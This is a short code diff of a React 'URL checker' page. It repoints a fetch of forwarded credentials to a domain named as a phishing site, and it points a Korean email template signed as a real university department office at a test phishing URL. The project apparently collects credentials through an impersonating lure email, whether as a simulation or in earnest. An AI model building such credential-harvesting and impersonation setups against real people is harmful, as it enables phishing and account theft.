@@ -20,7 +20,7 @@ export default function URLCheckerPage() {
   useEffect(() => {
     const fetchCredentials = async () => {
       try {
-        const res = await fetch('http://localhost:3000/api/forwarded');
+        const res = await fetch('https://Pooshoong-Pashoong-Phishing.com/api/forwarded');
         const data = await res.json();
         if (Array.isArray(data)) setCredentials(data);
       } catch (err) {
@@ -396,7 +396,7 @@ export default function URLCheckerPage() {
 
 감사합니다.  
 인하대학교 컴퓨터공학과 행정실 드림`}
-  url="http://localhost:8001"
+  url="https://test-Pooshoong-Pashoong-Phishing.com"
 />
 
 
